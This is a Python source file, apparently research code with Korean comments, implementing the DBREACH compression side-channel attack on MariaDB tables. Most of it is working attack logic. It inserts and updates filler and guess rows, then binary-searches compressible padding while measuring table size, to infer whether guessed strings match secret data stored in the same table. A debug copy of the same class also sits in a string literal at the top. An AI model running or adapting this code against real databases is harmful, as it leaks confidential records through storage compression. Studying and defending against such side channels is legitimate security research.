import utils.mariadb_utils as utils
import dbreacher
import time
import random
import sys

'''

class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(self, controller : utils.MariaDBController, tablename : str, startIdx : int, maxRowSize: int, fillerCharSet : set, compressCharAscii : int, compressible_bytes: int,random_bytes: int, guesses : str, random_guess_len : int):
        dbreacher.DBREACHer.__init__(self, controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0 
        self.bytesShrunkForInsertGuess = 0
        self.bytesShrunkForBeforeGuess = 0
        self.rowsAdded = 0 
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False
        self.db_count = 0
        self.previously_shrunk = False
        self.compressible_bytes = compressible_bytes    ###
        self.random_bytes = random_bytes                    ###
        self.guesses = guesses                                 ###
        self.random_guess_len = random_guess_len
        self.maxRowSize = maxRowSize
    def reinsertFillers(self) -> bool:

        self.compressibilityScoreReady = False
        if self.fillersInserted:
            print("start reinsert...")
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):  #이 부분 확인 필요
                self.control.update_row(self.table, row, utils.get_compressible_str(self.compressible_bytes, char = self.compressChar))
                self.db_count += 1
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
                print("delete_row : ",row)
                self.control.delete_row(self.table, row)
                self.db_count += 1
            
            self.bytesShrunkForCurrentGuess = 0
            # self.fillers = [''.join(random.choices(self.fillerCharSet, k=self.maxRowSize)) for _ in range(self.numFillerRows)]
        else:
            pass

        return self.insertFillers()

    # return True if successful
    def insertFillers(self) -> bool:
        
        self.fillersInserted = True
        oldSize = self.control.get_table_size(self.table)
        print(f"old table size : {oldSize} bytes" )
        
        # insert first filler row for putting in guesses:
        self.control.insert_row(self.table, self.startIdx, self.fillers[0])
        print(f"Start Inserting filler at row {self.startIdx}: {self.fillers[0]}")
        self.db_count += 1
        self.rowsAdded = 1
        newSize = self.control.get_table_size(self.table)
        print(f"New table size after inserting row {self.startIdx} : {newSize} bytes")
         
        if newSize > oldSize:
            # return self.reinsertFillers() ### <-- return False 대신에 reinsertFillers() 호출하도록 수정
            return False
        
        
        compression_bootstrapper = utils.get_compressible_str(self.compressible_bytes, char = self.compressChar) ###
        
        
        # insert filler rows until table grows:
        i = 1
        while newSize <= oldSize:
            print(f"Inserting filler at row {self.startIdx + i}: {compression_bootstrapper + self.fillers[i][int(self.compressible_bytes):]}")        ###
            self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][int(self.compressible_bytes):])       ###
            self.db_count += 1
            newSize = self.control.get_table_size(self.table)
            print(f"New table size after inserting row {self.startIdx + i}: {newSize} bytes")
            i += 1
            self.rowsAdded += 1
        self.rowsChanged = [False, False, False, False]
        print(f"Inserted {self.rowsAdded} filler rows successfully.")
        # sys.exit("Program terminated.")
        
        
        ####guess string을 삽입하기 전에 마지막 fillerRow에서 몇개의 별표를 추가하면 테이블 사이즈가 줄어드는지 확인하는 바이너리 서치(첫번째 바이너리 서치).
        refGuess = '*' * self.compressible_bytes + ''.join(random.choices(self.fillerCharSet, k=self.random_bytes))     #
        self.addCompressibleByteAndCheckIfShrunkBeforeGuess(refGuess,0,self.random_bytes)                                                              #
        print(f"added compressible bytes : {self.bytesShrunkForBeforeGuess}")                              #                
        
        print("random_guess_len : ", self.random_guess_len)
        compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForBeforeGuess - self.random_guess_len , char = self.compressChar)
        self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):])
        print(f"updating row with {self.startIdx + self.rowsAdded - 1} : {compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]}")
         
        
        new_size = self.control.get_table_size(self.table)
        
        print(f"new_table_size after binary search : {new_size} bytes")
        # sys.exit("Program terminated.")
        
        return True

        
    def insertGuessAndCheckIfShrunk(self, guess : str) -> bool:
        
        #### guess string을 삽입하기 전에 마지막 fillerRow를 원래 상태로 되돌리는 부분
        compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForBeforeGuess - self.random_guess_len , char = self.compressChar)
        self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):])
        print(f"updating row with {self.startIdx + self.rowsAdded - 1} for new guess: {compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]}")
        self.compressibilityScoreReady = False
        # self.bytesShrunkForCurrentGuess = 0
        self.previously_shrunk = False

        
        old_size = self.control.get_table_size(self.table)
        print("old size before insert guess : " , old_size)
        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            self.control.update_row(self.table, self.startIdx, new_first_row)
            print(f"updating row with {self.startIdx} : {new_first_row}")
            self.db_count += 1
            self.rowsChanged[0] = True
        new_size = self.control.get_table_size(self.table)
        print("new size after insert guess : ", new_size)
        
        return new_size < old_size

    def getSNoReferenceScore(self, length : int, charSet) -> float:
        
        print("get SNo refScore...")
        refGuess = ''.join(random.choices(charSet, k=length)) 
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            return 0   ### <--- return 0 으로 수정
            # raise RuntimeError("Table shrunk too early on insertion of guess") return 0
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
            # print(f"bNoReferenceScores : {self.bytesShrunkForCurrentGuess}")
        if self.getBytesShrunkForCurrentGuess() == 100: 
            shrunk = False
            while not shrunk:
                shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, 100, 200)
                # print(f"bNoReferenceScores : {self.bytesShrunkForCurrentGuess}")
        # if self.getBytesShrunkForCurrentGuess() == 200:
        #     shrunk = False
        #     while not shrunk:
        #         shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, 200, 300)
        #         # print(f"bNoReferenceScores : {self.bytesShrunkForCurrentGuess}")
        return self.getBytesShrunkForCurrentGuess()

    # raises RuntimeError if table shrinks prematurely
    def getSYesReferenceScore(self, length : int) -> float:
        
        print("get SYes refScore...")
        refGuess = self.fillers[1][self.compressible_bytes:][:length]  
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            return 0  ### <--- return 0 으로 수정
            # raise RuntimeError("Table shrunk too early on insertion of guess") return 0
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)                     # shrunk = true
            
            # print(f"bYesReferenceScores : {self.bytesShrunkForCurrentGuess}")
        return self.getBytesShrunkForCurrentGuess()  
    
    def addCompressibleByteAndCheckIfShrunk(self, refGuess, lowBytes=0, highBytes=None) -> bool:
        if highBytes is None:
            highBytes = self.random_guess_len

        while highBytes >= lowBytes:
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForCurrentGuess = midBytes

            shrunk = self.checkIfShrunk(midBytes)

            if shrunk:
                highBytes = midBytes - 1
            else:
                lowBytes = midBytes + 1

        self.compressibilityScoreReady = True
        return True
    
    def addCompressibleByteAndCheckIfShrunkBeforeGuess(self, refGuess, lowBytes=0, highBytes=None) -> bool:
    
        if highBytes is None:
            highBytes = self.random_bytes
            
        while highBytes >= lowBytes:
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForBeforeGuess = midBytes
            
            shrunk = self.checkIfShrunkBeforeGuess(midBytes)
            if shrunk:
                highBytes = midBytes - 1
            else:
                lowBytes = midBytes + 1
        self.compressibilityScoreReady = True
        return True
    
 
    ###guess string을 삽입한 뒤 두번째 바이너리 서치를 하면서 테이블 사이즈가 줄어드는지 확인하는 부분
    def checkIfShrunk(self, bytesShrunkForCurrentGuess ) -> bool:
        
        old_size = self.control.get_table_size(self.table)
        #print(f"old_table_size : {old_size} bytes")
        old_row = ''
        if bytesShrunkForCurrentGuess <= self.maxRowSize :
            self.rowsChanged[1] = True
        
            compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForBeforeGuess -self.random_guess_len + bytesShrunkForCurrentGuess , char = self.compressChar)
            
            print("byte : ", bytesShrunkForCurrentGuess)
            print(f"len : compressible bytes :  {self.compressible_bytes} , added compressible bytes before insert guess :  {self.bytesShrunkForBeforeGuess - self.random_guess_len} ,added compressible bytes after insert guess {self.bytesShrunkForCurrentGuess}")
            # print("len : " , self.compressible_bytes ,"and", self.bytesShrunkForBeforeGuess - self.random_guess_len , "and", bytesShrunkForCurrentGuess)
            
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            print(f"updating row with {self.startIdx + self.rowsAdded - 1} : {compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]}")
            self.db_count += 1
            new_size = self.control.get_table_size(self.table)
            print(f"new_table_size : {new_size} bytes")
            
            # print("binary search result of ")
            
            if new_size < old_size or (new_size == old_size and self.previously_shrunk == True):
                self.compressibilityScoreReady = True
                self.previously_shrunk = True
                return True
            else:
                self.previously_shrunk = False
                return False
        else:
            #print("Didn't shrink at all ????")
            raise RuntimeError()
            self.compressibilityScoreReady = True
            return True


    #### guess string을 삽입하기 전에 첫번째 바이너리 서치를 하면서 테이블 사이즈가 줄어드는지 확인하는 부분
    def checkIfShrunkBeforeGuess(self, bytesShrunkForBeforeGuess ) -> bool:
        
        old_size = self.control.get_table_size(self.table)
        #print(f"old_table_size : {old_size} bytes")
        old_row = ''
        # if bytesShrunkForCurrentGuess <= 100: 
        if bytesShrunkForBeforeGuess <= self.random_bytes : ## maxRowSize 대신에 random byte로 수정.
            self.rowsChanged[1] = True
        
            compress_str = utils.get_compressible_str(self.compressible_bytes + bytesShrunkForBeforeGuess , char = self.compressChar)
            
            print("byte : ", bytesShrunkForBeforeGuess)
            print(f"len : compressible bytes :  {self.compressible_bytes} , added compressible bytes before insert guess :  {self.bytesShrunkForBeforeGuess} ,added compressible bytes after insert guess {self.bytesShrunkForCurrentGuess}")
            
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            print(f"updating row with {self.startIdx + self.rowsAdded - 1} : {compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]}")
            self.db_count += 1
            new_size = self.control.get_table_size(self.table)
            print(f"new_table_size : {new_size} bytes")
            if new_size < old_size or (new_size == old_size and self.previously_shrunk == True):
                self.compressibilityScoreReady = True
                self.previously_shrunk = True
                return True
            else:
                self.previously_shrunk = False
                return False
        else:
            #print("Didn't shrink at all ????")
            raise RuntimeError()
            self.compressibilityScoreReady = True
            return True

    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if self.compressibilityScoreReady:
            print(self.bytesShrunkForCurrentGuess)
            return float(1) / float(self.bytesShrunkForCurrentGuess)
            
        else:
            return None

    def getBytesShrunkForCurrentGuess(self) -> int:
        
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        else:
            return None
'''


class DBREACHerImpl(dbreacher.DBREACHer):
    def __init__(self, controller : utils.MariaDBController, tablename : str, startIdx : int, maxRowSize: int, fillerCharSet : set, compressCharAscii : int, compressible_bytes: int,random_bytes: int, guesses : str, random_guess_len : int):
        dbreacher.DBREACHer.__init__(self, controller, tablename, startIdx, maxRowSize, fillerCharSet, compressCharAscii)
        self.compressibilityScoreReady = False
        self.bytesShrunkForCurrentGuess = 0 
        self.bytesShrunkForInsertGuess = 0
        self.bytesShrunkForBeforeGuess = 0
        self.rowsAdded = 0 
        self.rowsChanged = [False, False, False, False]
        self.fillersInserted = False
        self.db_count = 0
        self.previously_shrunk = False
        self.compressible_bytes = compressible_bytes    ###
        self.random_bytes = random_bytes                    ###
        self.guesses = guesses                                 ###
        self.random_guess_len = random_guess_len
        self.maxRowSize = maxRowSize
    def reinsertFillers(self) -> bool:

        self.compressibilityScoreReady = False
        if self.fillersInserted:
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):  #이 부분 확인 필요
                self.control.update_row(self.table, row, utils.get_compressible_str(self.compressible_bytes, char = self.compressChar))
                self.db_count += 1
            for row in range(self.startIdx, self.rowsAdded + self.startIdx):
                self.control.delete_row(self.table, row)
                self.db_count += 1
            
            self.bytesShrunkForCurrentGuess = 0
            # self.fillers = [''.join(random.choices(self.fillerCharSet, k=self.maxRowSize)) for _ in range(self.numFillerRows)]
        else:
            pass

        return self.insertFillers()

    # return True if successful
    def insertFillers(self) -> bool:
        
        self.fillersInserted = True
        oldSize = self.control.get_table_size(self.table)
        
        # insert first filler row for putting in guesses:
        self.control.insert_row(self.table, self.startIdx, self.fillers[0])
        self.db_count += 1
        self.rowsAdded = 1
        newSize = self.control.get_table_size(self.table)
         
        if newSize > oldSize:
            return self.reinsertFillers() ### <-- return False 대신에 reinsertFillers() 호출하도록 수정
            # return False
        
        
        compression_bootstrapper = utils.get_compressible_str(self.compressible_bytes, char = self.compressChar) ###
        
        
        # insert filler rows until table grows:
        i = 1
        while newSize <= oldSize:
            self.control.insert_row(self.table, self.startIdx + i, compression_bootstrapper + self.fillers[i][int(self.compressible_bytes):])       ###
            self.db_count += 1
            newSize = self.control.get_table_size(self.table)
            i += 1
            self.rowsAdded += 1
        self.rowsChanged = [False, False, False, False]
        # sys.exit("Program terminated.")
        
        
        ####guess string을 삽입하기 전에 마지막 fillerRow에서 몇개의 별표를 추가하면 테이블 사이즈가 줄어드는지 확인하는 바이너리 서치(첫번째 바이너리 서치).
        refGuess = '*' * self.compressible_bytes + ''.join(random.choices(self.fillerCharSet, k=self.random_bytes))     #
        self.addCompressibleByteAndCheckIfShrunkBeforeGuess(refGuess,0,self.random_bytes)                                                              #
        
        compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForBeforeGuess - self.random_guess_len , char = self.compressChar)
        self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):])
         
        
        new_size = self.control.get_table_size(self.table)
        
        # sys.exit("Program terminated.")
        
        return True

        
    def insertGuessAndCheckIfShrunk(self, guess : str) -> bool:
        
        #### guess string을 삽입하기 전에 마지막 fillerRow를 원래 상태로 되돌리는 부분
        compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForBeforeGuess - self.random_guess_len , char = self.compressChar)
        self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):])
        self.compressibilityScoreReady = False
        # self.bytesShrunkForCurrentGuess = 0
        self.previously_shrunk = False

        
        old_size = self.control.get_table_size(self.table)
        new_first_row = guess + self.fillers[0][len(guess):]
        if new_first_row != self.fillers[0]:
            self.control.update_row(self.table, self.startIdx, new_first_row)
            self.db_count += 1
            self.rowsChanged[0] = True
        new_size = self.control.get_table_size(self.table)
        
        return new_size < old_size

    def getSNoReferenceScore(self, length : int, charSet) -> float:
        
        refGuess = ''.join(random.choices(charSet, k=length)) 
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            return 0   ### <--- return 0 으로 수정
            # raise RuntimeError("Table shrunk too early on insertion of guess") return 0
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)
            # print(f"bNoReferenceScores : {self.bytesShrunkForCurrentGuess}")
        if self.getBytesShrunkForCurrentGuess() == 100: 
            shrunk = False
            while not shrunk:
                shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, 100, 200)
                # print(f"bNoReferenceScores : {self.bytesShrunkForCurrentGuess}")
        # if self.getBytesShrunkForCurrentGuess() == 200:
        #     shrunk = False
        #     while not shrunk:
        #         shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess, 200, 300)
        #         # print(f"bNoReferenceScores : {self.bytesShrunkForCurrentGuess}")
        return self.getBytesShrunkForCurrentGuess()

    # raises RuntimeError if table shrinks prematurely
    def getSYesReferenceScore(self, length : int) -> float:
        
        refGuess = self.fillers[1][self.compressible_bytes:][:length]  
        shrunk = self.insertGuessAndCheckIfShrunk(refGuess)
        if shrunk:
            return 0  ### <--- return 0 으로 수정
            # raise RuntimeError("Table shrunk too early on insertion of guess") return 0
        while not shrunk:
            shrunk = self.addCompressibleByteAndCheckIfShrunk(refGuess)                     # shrunk = true
            
            # print(f"bYesReferenceScores : {self.bytesShrunkForCurrentGuess}")
        return self.getBytesShrunkForCurrentGuess()  
    
    
    def addCompressibleByteAndCheckIfShrunk(self, refGuess, lowBytes=0, highBytes=None) -> bool:
        if highBytes is None:
            highBytes = self.random_guess_len

        while highBytes >= lowBytes:
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForCurrentGuess = midBytes

            shrunk = self.checkIfShrunk(midBytes)

            if shrunk:
                highBytes = midBytes - 1
            else:
                lowBytes = midBytes + 1

        self.compressibilityScoreReady = True
        return True
    
    def addCompressibleByteAndCheckIfShrunkBeforeGuess(self, refGuess, lowBytes=0, highBytes=None) -> bool:
    
        if highBytes is None:
            highBytes = self.random_bytes
            
        while highBytes >= lowBytes:
            midBytes = (lowBytes + highBytes) // 2
            self.bytesShrunkForBeforeGuess = midBytes
            
            shrunk = self.checkIfShrunkBeforeGuess(midBytes)
            if shrunk:
                highBytes = midBytes - 1
            else:
                lowBytes = midBytes + 1
        self.compressibilityScoreReady = True
        return True
    
    
    
    # def addCompressibleByteAndCheckIfShrunk(self, refGuess, lowBytes=0, highBytes=None) -> bool:
    #     if highBytes is None :
            
    #         highBytes = self.random_guess_len
           
            
    #     if highBytes >= lowBytes:
    #         midBytes = (lowBytes + highBytes) // 2
    #         self.bytesShrunkForCurrentGuess  = midBytes
            
    #         shrunk = self.checkIfShrunk(midBytes )

    #         if shrunk:
    #             self.addCompressibleByteAndCheckIfShrunk(refGuess, lowBytes, midBytes-1)
    #         else:
    #             self.addCompressibleByteAndCheckIfShrunk(refGuess, midBytes + 1, highBytes)
        
        
    #     # compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForCurrentGuess - self.random_guess_len , char = self.compressChar)
    #     # self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):])
    #     # print(f"updating row with {self.startIdx + self.rowsAdded - 1} : {compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]}")
    #     self.compressibilityScoreReady = True
    #     return True
    
    
    #### 139Line에서 첫번째 바이너리 서치하는 코드에서 호출하는 부분
    # def addCompressibleByteAndCheckIfShrunkBeforeGuess(self, refGuess, lowBytes=0, highBytes=None) -> bool:
    
    #     if highBytes is None:
    #         highBytes = self.random_bytes
            
    #     if highBytes >= lowBytes:
    #         midBytes = (lowBytes + highBytes) // 2
    #         self.bytesShrunkForBeforeGuess = midBytes
    #         shrunk = self.checkIfShrunkBeforeGuess(midBytes)
    #         if shrunk:
    #             self.addCompressibleByteAndCheckIfShrunkBeforeGuess(refGuess, lowBytes, midBytes-1)
    #         else:
    #             self.addCompressibleByteAndCheckIfShrunkBeforeGuess(refGuess, midBytes + 1, highBytes)
    #     # self.compressibilityScoreReady = True
    #     return True
    
 
    ###guess string을 삽입한 뒤 두번째 바이너리 서치를 하면서 테이블 사이즈가 줄어드는지 확인하는 부분
    def checkIfShrunk(self, bytesShrunkForCurrentGuess ) -> bool:
        
        old_size = self.control.get_table_size(self.table)
        #print(f"old_table_size : {old_size} bytes")
        old_row = ''
        if bytesShrunkForCurrentGuess <= self.maxRowSize :
            self.rowsChanged[1] = True
        
            compress_str = utils.get_compressible_str(self.compressible_bytes + self.bytesShrunkForBeforeGuess -self.random_guess_len + bytesShrunkForCurrentGuess , char = self.compressChar)
            
            # print("len : " , self.compressible_bytes ,"and", self.bytesShrunkForBeforeGuess - self.random_guess_len , "and", bytesShrunkForCurrentGuess)
            
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            self.db_count += 1
            new_size = self.control.get_table_size(self.table)
            
            # print("binary search result of ")
            
            if new_size < old_size or (new_size == old_size and self.previously_shrunk == True):
                self.compressibilityScoreReady = True
                self.previously_shrunk = True
                return True
            else:
                self.previously_shrunk = False
                return False
        else:
            #print("Didn't shrink at all ????")
            raise RuntimeError()
            self.compressibilityScoreReady = True
            return True


    #### guess string을 삽입하기 전에 첫번째 바이너리 서치를 하면서 테이블 사이즈가 줄어드는지 확인하는 부분
    def checkIfShrunkBeforeGuess(self, bytesShrunkForBeforeGuess ) -> bool:
        
        old_size = self.control.get_table_size(self.table)
        #print(f"old_table_size : {old_size} bytes")
        old_row = ''
        # if bytesShrunkForCurrentGuess <= 100: 
        if bytesShrunkForBeforeGuess <= self.random_bytes : ## maxRowSize 대신에 random byte로 수정.
            self.rowsChanged[1] = True
        
            compress_str = utils.get_compressible_str(self.compressible_bytes + bytesShrunkForBeforeGuess , char = self.compressChar)
            
            
            self.control.update_row(self.table, self.startIdx + self.rowsAdded - 1, compress_str + self.fillers[self.rowsAdded - 1][len(compress_str):]) 
            self.db_count += 1
            new_size = self.control.get_table_size(self.table)
            if new_size < old_size or (new_size == old_size and self.previously_shrunk == True):
                self.compressibilityScoreReady = True
                self.previously_shrunk = True
                return True
            else:
                self.previously_shrunk = False
                return False
        else:
            #print("Didn't shrink at all ????")
            raise RuntimeError()
            self.compressibilityScoreReady = True
            return True

    def getCompressibilityScoreOfCurrentGuess(self) -> float:
        if self.compressibilityScoreReady:
            print(self.bytesShrunkForCurrentGuess)
            return float(1) / float(self.bytesShrunkForCurrentGuess)
            
        else:
            return None

    def getBytesShrunkForCurrentGuess(self) -> int:
        
        if self.compressibilityScoreReady:
            return self.bytesShrunkForCurrentGuess
        else:
            return None
            
            # '''